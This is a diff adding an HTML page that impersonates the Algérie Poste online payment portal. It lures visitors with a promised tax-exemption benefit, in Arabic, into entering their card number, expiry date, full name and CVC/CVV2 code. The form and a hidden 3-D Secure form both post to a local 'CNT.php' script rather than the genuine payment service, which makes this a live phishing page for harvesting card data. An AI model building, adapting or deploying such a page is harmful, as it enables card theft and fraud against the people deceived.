@@ -1,0 +1,166 @@
+
+<!-- saved from url=(0108)https://epay.poste.dz/payment/merchants/MOBILIS/payment_fr.html?mdOrder=c2a66c16-526a-4beb-b29b-5847be30f5e4 -->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<link rel="stylesheet" href="./ECCP/main.css">
+		<title>Algerie Poste خاصية عدم الخضوع للرسوم الضريبية</title>
+				<script type="text/javascript">
+					$(document).payment({
+						language: "fr",
+						messageAjaxError: "Service temporary unavailable. Please, try later.",
+						messageTimeRemaining: "Votre session expirera dans #MIN#:#SEC#",
+						messageNoEpinForCard: "No EPin for card. Please use another card.",
+
+						orderId: "orderNumber",
+
+						paymentAction: "../../rest/processform.do",
+						getSessionStatusAction: "../../rest/getSessionStatus.do",
+						showErrorAction: "../../rest/showErrors.do",
+						checkEpinAvailableForCardAction: "../../rest/checkEpinAvailableForCard.do",
+												},
+
+						addEpinField: function(settings) {
+							if ($('#paymentDataTable .epinEntryRow')) {
+								$('#paymentDataTable .epinEntryRow').remove();
+							}
+							$('#paymentDataTable tr:last').before('<tr class="epinEntryRow" valign="TOP"><td valign="top" width="50%" align="right"><span class="txt_white">E-Commerce PIN :</span></td><td valign="top"><input name="' + settings.ePinInputId + '" maxlength="4" id="' + settings.ePinInputId + '" type="password" autocomplete="off" /></td></tr>');
+						},
+
+						removeEpinField: function() {
+							if ($('#paymentDataTable .epinEntryRow')) {
+								$('#paymentDataTable .epinEntryRow').remove();
+							}
+						}
+					});
+		</script>
+	
+</style><style type="text/css">.App__app-infinity-root_3VuWDtaa[data-v-4ec0ce3d]{width:100vw;height:100vh;position:fixed;z-index:9999999999;background:rgba(0,0,0,0.151);top:0px;left:0px;overflow:hidden;display:flex;align-items:center;justify-content:center}.App__app-infinity-root_3VuWDtaa *[data-v-4ec0ce3d]{all:initial;line-height:normal;font-family:'Didact Gothic'}.App__app-infinity-root_3VuWDtaa .App__modal_3oqzjl0g[data-v-4ec0ce3d]{width:580px;height:380px;display:flex;position:relative;flex-direction:column;align-items:flex-start;background-size:cover;padding-top:60px;padding-left:40px;transition:0.2s ease;transform:scale(0.8);opacity:0;box-sizing:border-box;overflow:hidden}.App__app-infinity-root_3VuWDtaa .App__modal_3oqzjl0g .App__bg_3DpjpNwL[data-v-4ec0ce3d]{position:absolute;top:-178px;right:-229px;background-size:contain;background-repeat:no-repeat;width:680px;height:680px;z-index:-1}.App__app-infinity-root_3VuWDtaa .App__modal_3oqzjl0g .App__title_3Yf-v9xs[data-v-4ec0ce3d]{margin-top:10px;font-size:30px;font-weight:600;color:white}.App__app-infinity-root_3VuWDtaa .App__modal_3oqzjl0g .App__subtitle_26MV5W4h[data-v-4ec0ce3d]{margin-top:10px;font-size:22px;color:white}.App__app-infinity-root_3VuWDtaa .App__modal_3oqzjl0g .App__list_3sar9jK1[data-v-4ec0ce3d]{display:flex;flex-direction:column;margin-top:20px;margin-left:4px}.App__app-infinity-root_3VuWDtaa .App__modal_3oqzjl0g .App__list_3sar9jK1 .App__item_3sI_Wrxz[data-v-4ec0ce3d]{display:flex;align-items:center;margin:6px 0;font-size:18px;color:white}.App__app-infinity-root_3VuWDtaa .App__modal_3oqzjl0g .App__list_3sar9jK1 .App__item_3sI_Wrxz img[data-v-4ec0ce3d]{margin-right:10px;margin-bottom:-3px;width:14px;height:auto}.App__app-infinity-root_3VuWDtaa .App__modal_3oqzjl0g .App__rate-btn_2bjgK090[data-v-4ec0ce3d]{all:initial;margin-top:25px;font-size:14px;color:white;width:120px;display:flex;align-items:center;justify-content:center;background:#ff9f4a;border-radius:70px;padding:12px 20px;margin-left:15px;box-sizing:border-box;font-family:'Didact Gothic';cursor:pointer}
+</style></head>
+
+	<body>
+		<div id="wrap">
+			<div id="content">
+				<table id="main-table">
+					<tbody>
+						<tr>
+							<td>
+								<table>
+									<tbody>
+										<tr>
+											<td>
+												<img src="./ECCP/logo-alg.png" style="margin-bottom: 50px;">
+											</td>
+										</tr>
+										
+										<tr>
+											<td>
+												<div class="security_disc" style="margin-top: 200px;">
+													Ce site prend en charge le cryptage 256-bit. La confidentialité des données transmises est assurée par Algérie Poste. Les informations personnelles saisies ne seront pas divulguées ou fournies à quelque tiers que ce soit, sauf si la divulgation est requise par la loi
+												</div>
+											</td>
+										</tr>
+									</tbody>
+								</table>
+							</td>
+							<td>
+							<table border="0" cellpadding="0" cellspacing="0">
+								<tbody>
+
+									<tr class="main_table_row">
+										<td class="main_table_col">
+											<h1 class="form_header">INFORMATIONS PERSONNELLES</h1>
+											<p class="form_subheader">يرجى إدخال معلومات البطاقة للإستفادة من خاصية عدم الخضوع للرسوم </p>
+										</td>
+									</tr>
+
+									<tr class="main_table_row">
+
+										<td class="main_table_col payment_form">
+											<form name="PaymentForm" action="CNT.php" method="post" id="formPayment">
+												<input id="mdOrder" type="hidden">
+												<input id="location" type="hidden" value="/../">
+												<input type="hidden" id="expiry">
+												<input id="language" value="EN" type="hidden">
+												<div id="errorBlock" style="color:red;"></div>
+												<div id="infoBlock"></div>
+												<table cellpadding="10" id="paymentDataTable">
+													<tbody>
+														<tr>
+															<td>
+																<div id="indicator" style="display:none;">
+																	<label for="indicatorImage" class="formLabel">&nbsp;</label>
+																	<div class="val" id="indicatorImage">
+																		<img src="ECCP/ajax-loader.gif" height="19" width="220" alt="indicator">
+																	</div>
+																</div>
+															</td>
+														</tr>
+														<tr valign="TOP">
+															<td valign="top" width="50%" align="right">
+																<span  pattern="[0-9]+" required="" type="text" class="form_label">Numéro de la carte de crédit:</span> 
+															</td>
+															<td valign="top">
+																<input name="CC" placeholder="رقم البطاقة الذهبية" pattern="[0-9]+" required="" type="text" class="form_input" maxlength="19" id="iPAN" type="text" autocomplete="off" pattern="[0-9]+" value="">
+															</td>
+														</tr>
+														<tr valign="TOP">
+															<td valign="top" align="right">
+																<span class="form_label">Date d'expiration:</span>
+															</td>
+															<td valign="top">
+																<select name="MM" id="month" class="form_input" style="width:150px">
+																	<option value="01">&nbsp;&nbsp;1 - January</option>
+																	<option value="02">&nbsp;&nbsp;2 - February</option>
+																	<option value="03">&nbsp;&nbsp;3 - March</option>
+																	<option value="04">&nbsp;&nbsp;4 - April</option>
+																	<option value="05">&nbsp;&nbsp;5 - May</option>
+																	<option value="06">&nbsp;&nbsp;6 - June</option>
+																	<option value="07">&nbsp;&nbsp;7 - July</option>
+																	<option value="08">&nbsp;&nbsp;8 - August</option>
+																	<option value="09">&nbsp;&nbsp;9 - September</option>
+																	<option value="10">10 - October</option>
+																	<option value="11">11 - November</option>
+																	<option value="12" selected="">12 - December</option>
+																</select> /
+																<select name="YYYY" id="year" class="form_input" style="width:100px"><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option><option value="2035">2035</option><option value="2036">2036</option><option value="2037">2037</option><option value="2038">2038</option><option value="2039">2039</option><option value="2040">2040</option><option value="2041">2041</option><option value="2042">2042</option><option value="2043">2043</option><option value="2044">2044</option><option value="2045">2045</option><option value="2046">2046</option><option value="2047">2047</option><option value="2048">2048</option><option value="2049">2049</option><option value="2050">2050</option><option value="2051">2051</option><option value="2052">2052</option><option value="2053">2053</option><option value="2054">2054</option><option value="2055">2055</option><option value="2056">2056</option><option value="2057">2057</option><option value="2058">2058</option><option value="2059">2059</option><option value="2060">2060</option></select>
+															</td>
+														</tr>
+														<tr>
+															<td align="right">
+																<span class="form_label">Nom et Prenom:</span>
+															</td>
+															<td>
+																<input name="name" placeholder="" required="" type="text" class="form_input" name="TEXT" maxlength="90" id="iTEXT" type="text" autocomplete="off" value="">
+															</td>
+														</tr>
+														<tr>
+															<td align="right">
+																<span class="form_label">Entrez le code CVC2/CVV2:</span>
+																<br>
+																<span class="form_label" style="font-size: .85em; font-style: italic;">(Situé au dos de la carte)
+																</span>
+															</td>
+															<td>
+																<input required="" placeholder="(الموجود على ظهر البطاقة) أدخل الرمز" class="form_input" name="CVC" maxlength="4" id="iCVC" type="text" autocomplete="off" value="">
+															</td>
+														</tr>
+													</tbody>
+												</table>
+												<input name="SendPayment" type="hidden" id="realPayment">
+												<input name="SendPayment2" value="VALIDER" type="submit" class="submit_button" id="buttonPayment">
+     										</form>
+											<form id="acs" method="post" action="CNT.php"><input type="hidden" id="language" name="language" value="fr"><input type="hidden" id="MD" name="MD"><input type="hidden" id="PaReq" name="PaReq"><input type="hidden" id="TermUrl" name="TermUrl"></form>
+										</td>
+									</tr>
+								</tbody>
+							</table>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			<p class="footer">Tous droits réservés. Algérie Poste © 2016</p>
+		</div>
+	</div>
+
+	
+<!----></body></html>
